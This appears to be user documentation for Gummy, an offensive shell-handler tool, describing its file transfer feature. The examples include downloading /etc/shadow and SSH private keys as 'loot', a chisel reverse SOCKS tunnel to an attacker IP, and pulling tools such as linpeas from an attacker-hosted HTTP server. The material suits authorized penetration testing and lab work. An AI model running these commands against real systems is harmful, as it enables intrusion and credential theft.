# File Transfers

Gummy supports uploading and downloading files with progress tracking and integrity verification. In the TUI, transfers run asynchronously and progress appears in the status bar so the main output pane stays clean.

## Upload

Upload a local file to the remote system:

```
󰗣 gummy [1] ❯ upload /path/to/linpeas.sh /tmp/linpeas.sh
```

If no remote path is given, the file is uploaded to the current working directory with the same filename:

```
󰗣 gummy [1] ❯ upload linpeas.sh
```

### Upload Methods

Gummy automatically selects the best method:

#### HTTP Mode (binbag enabled)

When binbag is enabled, uploads use HTTP — orders of magnitude faster:

- **Linux:** `curl -o /path http://IP:PORT/file`
- **Windows:** `Invoke-WebRequest -Uri http://IP:PORT/file -OutFile C:\path`

One HTTP request, done in seconds even for large files.

#### Base64 Chunking (fallback)

When binbag is disabled, files are encoded in base64 and sent in chunks:

- **Linux:** 32KB chunks, decoded with `base64 -d`
- **Windows:** 1KB chunks via PowerShell `Out-File`

Slower but works everywhere without extra infrastructure.

### SmartUpload

The `SmartUpload` function (used by modules too) automatically picks HTTP if binbag is available, falling back to base64 chunks otherwise. You don't need to think about it.

## Download

Download a file from the remote system:

```
󰗣 gummy [1] ❯ download /etc/passwd
```

Specify a local filename:

```
󰗣 gummy [1] ❯ download /etc/shadow shadow.txt
```

Downloads are saved to the session directory: `~/.gummy/YYYY_MM_DD/IP_user_hostname/`.

The process:

1. Remote file is base64-encoded
2. Sent over the shell connection
3. Decoded locally
4. MD5 checksum verified

## Progress & Cancellation

Both upload and download report live progress in the TUI status bar:

```
upload linpeas.sh 45% 128 KB
```

**Cancel a transfer:** Press `Ctrl+C` or `Esc` during the transfer.

While a transfer is active, command submission and shell detach are blocked intentionally.

## MD5 Verification

Every transfer includes MD5 checksum verification:

```
 Upload complete! (MD5: 8b1a9953)
```

The checksum is computed on both ends and compared to ensure data integrity.

## Practical Examples

### Upload a tool and run it

```
󰗣 gummy [1] ❯ upload chisel /tmp/chisel
 Upload complete! (MD5: a1b2c3d4)

󰗣 gummy [1] ❯ shell
$ chmod +x /tmp/chisel && /tmp/chisel client 10.10.14.5:8888 R:1080:socks
```

### Download loot

```
󰗣 gummy [1] ❯ download /etc/shadow
 Download complete! Saved to: shadow (MD5: 5d41402a)

󰗣 gummy [1] ❯ download /home/user/.ssh/id_rsa
 Download complete! Saved to: id_rsa (MD5: 9e107d9d)
```

### Bulk upload with binbag

With binbag enabled, place your tools in the binbag directory and they're instantly available:

```bash
# On your machine
cp chisel linpeas.sh pspy64 ~/Lab/binbag/

# In gummy
󰗣 gummy ❯ set binbag ~/Lab/binbag
 Binbag enabled (serving ~/Lab/binbag on http://10.10.14.5:8080/)

󰗣 gummy [1] ❯ upload chisel /tmp/chisel
# Uses HTTP — instant!
```
